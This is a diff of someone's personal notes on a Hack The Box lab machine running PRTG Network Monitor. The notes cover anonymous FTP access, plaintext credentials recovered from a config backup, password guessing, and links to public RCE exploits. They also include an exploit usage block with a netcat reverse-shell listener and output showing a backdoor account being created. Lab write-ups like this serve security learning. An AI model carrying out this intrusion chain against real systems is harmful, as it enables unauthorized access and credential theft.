@@ -1,21 +1,109 @@
 #####################
 # Sources and Links #
 #####################
-https://www.youtube.com/watch?v=ZxvgniJXbOo
+PRTG data storage
+https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
+
+Discovering and using vulnerabilities using searchsploit
+https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/
+
+CVE details
+https://www.exploit-db.com/exploits/46527
+
+Github CVE Exploit
+https://github.com/M4LV0/PRTG-Network-Monitor-RCE
+
+Another Github exploit, an improved version of the above link
+https://github.com/wildkindcc/CVE-2018-9276
 
 #########
 # TL,DR #
 #########
-Anonymous FTP access gives direct access to Users folder
+Anonymous FTP access gives direct access to Users folder for user.txt
 
 ########
 # Hack #
 ########
+nmap shows http, ftp, msrpc, netbios-ssn, microsoft-ds, and unknown
+There is anonymous ftp access!
 ftp 10.10.10.152
 cd Users
 get users.txt
 dd58ce67b49e15105e88096c8d9255a5
 
+Now time for root. Port 80 shows PRTG network monitor.
+Gobuster is returning an error: Client.Timeout exceeded while awaiting headers.
+
+PRTG's default creds are prtgadmin:prtgadmin but that comes back as invalid.
+A reset password link says an email is sent when user prtgadmin is entered.
+
+Hmm. Let's poke around in the ftp server and see if there are any clues.
+According to the link in sources, PRTG stores it's data in a few locations. 
+Program Files\PRTG Network Monitor
+Program Files(x86)\PRTG Network Monitor
+Programdata\Paessler\PRTG Network Monitor
+
+ftp://10.10.10.152/../../Windows/PRTG Configuration.dat exists, but I can't make anything of it.
+
+dir -al shows hidden files.
+/Programdata/Paessler/PRTG Network Monitor has interesting data!
+I dumped interesting data into my local FTP_Files/ directory.
+
+Searching through PRTG\ Configuration.old.bak gives login credentials:
+   <dbpassword>
+          <!-- User: prtgadmin -->
+          PrTg@dmin2018
+
+prtgadmin:PrTg@dmin2018
+
+Login still says invalid credentials...
+PrTg@dmin2019
+PrTg@dmin2020
+PrTg@dmin2021
+ 
+I reset the machine and prtgadmin:PrTg@dmin2019 granted access!
+
+A support ticket reads:
+Version 18.4.47.1962 has been downloaded and is ready for installation. 
+So this PRTG version must be < 18.4.47.1962 
+Found: 
+Installed Version
+18.1.37.13946 
+
+
+searchsploit shows some interesting things for prtg
+PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                          
+| exploits/windows/webapps/46527.sh
+
+This .sh file has the following instructions:
+# Usage:                                                 #
+# 1/ Launch a listening netcat to listen for the shell   #
+# nc -p 45295 -l                                         #
+#                                                        #
+# 2/ p7snort119.sh yourIP [Ret_Addr]                     #
+#                                                        #
+# Where yourIP is the IP where the netcat is listening   #
+# and Ret_Addr is the address (8 hexa digits) of the     #
+# shellcode (eg: 0819fec2)                               #
+#
 ###########
 # Learned #
 ###########
+Reset the HTB machine if obvious credentials are not working!
+
+searchsploit -p foobar 
+copies the directory of foobar's exploit
+searchsploit -p prtg 18.2 copied /usr/share/exploitdb/exploits/linux/remote/18.sh to clipboard
+
+I couldn't get this to work so I'll keeep looking.
+There's an interesting github repo with an exploit. 
+It calls for intercepting a valid login cookie with burp.
+
+Cookie	OCTOPUS1813713946	e0Y0QkM3NERELTlGQkUtNDAxNS05M0QxLTFDOUIyMkUxQzQwMn0%3D
+
+I ran the script and got output
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+
+New credentials still give invalid login.
+
+Trying another github repo...
